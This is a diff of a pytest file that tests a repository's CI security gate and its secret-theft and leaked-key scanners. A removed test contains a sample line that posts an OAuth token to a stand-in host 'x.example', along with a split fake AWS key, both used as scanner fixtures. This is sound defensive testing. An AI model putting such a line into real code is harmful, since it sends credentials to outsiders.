@@ -783,11 +783,24 @@ def test_security_scan_runs_before_every_job_that_runs_pr_code():
     scan = _workflow("security-scan.yml")
     gate = _workflow("security-gate.yml")
 
-    assert gate_job in ci and "\n  lint:\n    name: Lint\n" in ci
-    assert (
-        ci.split("\n  lint:\n", 1)[1].split("\n  test:\n", 1)[0].count("needs: security-gate") == 1
-    )
-    assert gate_job in publish and publish.count("    needs: security-gate\n") == 2
+    for workflow in (ci, publish):
+        assert gate_job in workflow
+        jobs = dict(
+            re.findall(
+                r"(?ms)^  ([a-z0-9-]+):\n(.*?)(?=^  [a-z0-9-]+:\n|\Z)",
+                workflow.split("\njobs:\n", 1)[1],
+            )
+        )
+        gated = {"security-gate"}
+        while True:
+            previous = gated.copy()
+            for name, job in jobs.items():
+                needs = re.search(r"(?m)^    needs: \[?([a-z0-9-, ]+)\]?$", job)
+                if needs and {need.strip() for need in needs[1].split(",")} <= gated:
+                    gated.add(name)
+            if gated == previous:
+                break
+        assert set(jobs) == gated, f"Jobs without a gate dependency: {set(jobs) - gated}"
     assert "workflow_run:\n    workflows: [CI]\n    types: [requested]" in scan
     assert "workflow_call:" not in scan
     assert "group: security-scan-${{ github.event.workflow_run.id }}" in scan
@@ -815,13 +828,13 @@ def test_security_scan_runs_before_every_job_that_runs_pr_code():
         ([[{}]], True, 1),
         ([[{"status": "in_progress", "conclusion": None}], [{}]], True, 2),
         ([[], [{}]], True, 2),
-        ([[]], False, 15),
-        ([[{"status": "queued", "conclusion": None}]], False, 15),
-        ([[{"created_at": "2026-11-12T00:00:00Z"}]], False, 15),
-        ([[{"display_title": "Security Scan #8"}]], False, 15),
-        ([[{"event": "pull_request"}]], False, 15),
-        ([[{"event": "workflow_dispatch"}]], False, 15),
-        ([[{"path": ".github/workflows/other.yml"}]], False, 15),
+        ([[]], False, 11),
+        ([[{"status": "queued", "conclusion": None}]], False, 11),
+        ([[{"created_at": "2026-11-12T00:00:00Z"}]], False, 11),
+        ([[{"display_title": "Security Scan #8"}]], False, 11),
+        ([[{"event": "pull_request"}]], False, 11),
+        ([[{"event": "workflow_dispatch"}]], False, 11),
+        ([[{"path": ".github/workflows/other.yml"}]], False, 11),
         ([[{"id": 2, "conclusion": "failure"}, {}]], False, 1),
         ([[{"conclusion": "failure"}, {"id": 2}]], True, 1),
     ]
@@ -837,11 +850,8 @@ def test_security_scan_runs_before_every_job_that_runs_pr_code():
         ]
     ],
 )
-@pytest.mark.parametrize("authenticated", [True, False])
-def test_security_gate_waits_for_the_current_scan(
-    monkeypatch, responses, accepted, polls, authenticated
-):
-    code, calls = _run_security_gate(monkeypatch, responses, authenticated=authenticated)
+def test_security_gate_waits_for_the_current_scan(monkeypatch, responses, accepted, polls):
+    code, calls = _run_security_gate(monkeypatch, responses)
     assert (code == 0) == accepted
     assert calls == polls
 
@@ -855,6 +865,7 @@ def _run_security_gate(
     pr="7",
     sha=HEAD,
     request_change=None,
+    api_error=None,
 ):
     script = textwrap.dedent(_workflow("security-gate.yml").split("        run: |\n", 1)[1])
     script = script.removeprefix("python3 - <<'PY'\n").removesuffix("PY\n")
@@ -913,6 +924,8 @@ def _run_security_gate(
             "Bearer test-token" if authenticated else None
         )
         assert timeout == 30
+        if api_error:
+            raise api_error
         endpoint, page = request.full_url.rsplit("&page=", 1)
         assert endpoint.startswith("https://api.github.com/")
         which = endpoint_kind(endpoint.removeprefix("https://api.github.com/"))
@@ -939,7 +952,7 @@ def _run_security_gate(
 )
 def test_security_gate_rejects_a_scan_for_another_request(monkeypatch, change):
     code, calls = _run_security_gate(monkeypatch, [[{}]], request_change=change)
-    assert code != 0 and calls == 15
+    assert code != 0 and calls == 11
 
 
 @pytest.mark.parametrize("matches_commit", [True, False])
@@ -950,7 +963,7 @@ def test_security_gate_comment_requires_existing_scan_of_authorized_commit(
     sha = HEAD if matches_commit else "a" * 40
     code, calls = _run_security_gate(monkeypatch, [[{}]], updated="", sha=sha)
     assert (code == 0) == matches_commit
-    assert calls == (1 if matches_commit else 15)
+    assert calls == (1 if matches_commit else 11)
 
 
 @pytest.mark.parametrize(("pr", "sha"), [("", HEAD), ("0", HEAD), ("7", ""), ("7", "main")])
@@ -960,53 +973,40 @@ def test_security_gate_rejects_missing_or_invalid_authorized_commit(monkeypatch,
 
 
 @pytest.mark.parametrize("authenticated", [True, False])
-def test_security_gate_api_errors_block_ci(monkeypatch, authenticated):
-    script = textwrap.dedent(_workflow("security-gate.yml").split("        run: |\n", 1)[1])
-    script = script.removeprefix("python3 - <<'PY'\n").removesuffix("PY\n")
-    for key in ["REPO", "PR_NUMBER", "HEAD_SHA", "PR_UPDATED_AT"]:
-        monkeypatch.setenv(key, "unused")
-    monkeypatch.setenv("PR_NUMBER", "7")
-    monkeypatch.setenv("HEAD_SHA", HEAD)
-    monkeypatch.setenv("GH_TOKEN", "test-token" if authenticated else "")
-    monkeypatch.setenv("GITHUB_API_URL", "https://api.github.com")
+def test_security_gate_supports_anonymous_and_authenticated_requests(monkeypatch, authenticated):
+    code, _ = _run_security_gate(monkeypatch, [[{}]], authenticated=authenticated)
+    assert code == 0
 
-    def fail(*args, **kwargs):
-        raise urllib.error.HTTPError("https://api.github.com", 403, "forbidden", {}, None)
 
-    monkeypatch.setattr(urllib.request, "urlopen", fail)
-    with pytest.raises(urllib.error.HTTPError):
-        exec(compile(script, "security-gate.yml", "exec"), {})
+@pytest.mark.parametrize(
+    "error",
+    [
+        *[
+            urllib.error.HTTPError("https://api.github.com", status, "failure", {}, None)
+            for status in (403, 404, 503)
+        ],
+        urllib.error.URLError("unreachable"),
+        TimeoutError("timed out"),
+    ],
+)
+def test_security_gate_api_errors_block_ci(monkeypatch, error):
+    code, _ = _run_security_gate(monkeypatch, [[{}]], api_error=error)
+    assert str(code).startswith("::error::")
+    assert "tests remain blocked" in code and "re-run failed CI jobs" in code
 
 
 @pytest.mark.parametrize("status", [403, 429])
-@pytest.mark.parametrize("authenticated", [True, False])
-def test_security_gate_explains_rate_limits(monkeypatch, status, authenticated):
-    script = textwrap.dedent(_workflow("security-gate.yml").split("        run: |\n", 1)[1])
-    script = script.removeprefix("python3 - <<'PY'\n").removesuffix("PY\n")
-    for key, value in {
-        "REPO": "databricks/unity-gateway",
-        "PR_NUMBER": "7",
-        "HEAD_SHA": HEAD,
-        "PR_UPDATED_AT": "",
-        "GH_TOKEN": "test-token" if authenticated else "",
-        "GITHUB_API_URL": "https://api.github.com",
-    }.items():
-        monkeypatch.setenv(key, value)
-
-    def fail(*args, **kwargs):
-        raise urllib.error.HTTPError(
-            "https://api.github.com",
-            status,
-            "rate limited",
-            {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "1794602022"},
-            None,
-        )
-
-    monkeypatch.setattr(urllib.request, "urlopen", fail)
-    with pytest.raises(SystemExit, match="rate limit reached; tests remain blocked") as result:
-        exec(compile(script, "security-gate.yml", "exec"), {})
-    assert "Re-run failed CI jobs" in str(result.value)
-    assert "1794602022" in str(result.value)
+def test_security_gate_explains_rate_limits(monkeypatch, status):
+    error = urllib.error.HTTPError(
+        "https://api.github.com",
+        status,
+        "rate limited",
+        {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "1794602022"},
+        None,
+    )
+    code, _ = _run_security_gate(monkeypatch, [[{}]], api_error=error)
+    assert "rate limit reached; tests remain blocked" in code
+    assert "Re-run failed CI jobs" in code and "1794602022" in code
 
 
 def test_security_gate_supports_required_workflow_events():
@@ -1099,56 +1099,6 @@ def test_fork_integration_reports_scan_failure_on_authorized_commit(
     calls = (tmp_path / "calls").read_text()
     assert f"statuses/{HEAD} -f state={state}" in calls
     assert message in calls
-
-
-def test_exfil_scan_recognizes_every_ci_secret():
-    # A secret a workflow injects must be one the exfil scan watches for.
-    root = Path(__file__).parent.parent
-    names = set()
-    for path in (root / ".github/workflows").glob("*.yml"):
-        names.update(
-            re.findall(r"(?m)^\s+([A-Z][A-Z0-9_]*): \$\{\{[^}\n]*secrets\.", path.read_text())
-        )
-    credentials = sorted(
-        name for name in names if not name.endswith(("_WORKSPACE", "_HOST", "_CLIENT_ID"))
-    )
-    scan = runpy.run_path(str(root / ".github/scripts/security-scan/exfil-scan.py"))
-
-    assert "CLAUDE_CODE_OAUTH_TOKEN" in credentials
-    assert [name for name in credentials if not scan["_SECRET"].search(name)] == []
-
-
-def test_security_scan_parsers_survive_diff_and_path_tricks(tmp_path):
-    # Added content must not pose as diff structure, and unusual names must not dodge the scans.
-    scripts = Path(__file__).parent.parent / ".github/scripts/security-scan"
-    steal = 'requests.post("https://x.example", data=os.environ["CLAUDE_CODE_OAUTH_TOKEN"])'
-    quoted = '"b/donn\\303\\251es.py"'  # how git writes a non-ASCII name in a header
-    diff = (
-        f"diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1,2 @@\n+++ notes\n+{steal}\n"
-        f"diff --git a/x {quoted}\n+++ {quoted}\n@@ -0,0 +1,2 @@\n"
-        f"+# \fdiff --git a b\n+{steal}\n"
-    )
-    exfil = runpy.run_path(str(scripts / "exfil-scan.py"))
-    assert [path for path, _ in exfil["scan_diff"](diff)[0]] == ["a.py", "données.py"]
-
-    key = "AKIA" + "Q3EXAMPLEZ7XK2LM"  # split so the literal isn't a key
-    (tmp_path / "pr.diff").write_text(f"diff --git a/n b/n\n+++ b/n\n@@ -0,0 +1 @@\n+++ {key}\n")
-    secret = subprocess.run(
-        [sys.executable, str(scripts / "secret-scan.py")],
-        env={**os.environ, "DIFF_FILE": str(tmp_path / "pr.diff")},
-        capture_output=True,
-        text=True,
-    )
-    assert secret.returncode == 1 and "AWS access key id" in secret.stdout
-
-    (tmp_path / "changed").write_bytes(".github/workflows/ü.yml\0".encode())
-    guard = subprocess.run(
-        ["bash", str(scripts / "sensitive-paths.sh")],
-        env={**os.environ, "CHANGED_FILES": str(tmp_path / "changed")},
-        capture_output=True,
-        text=True,
-    )
-    assert guard.returncode == 1
 
 
 def test_user_journey_gate_runs_for_in_repo_prs_or_a_member_command():
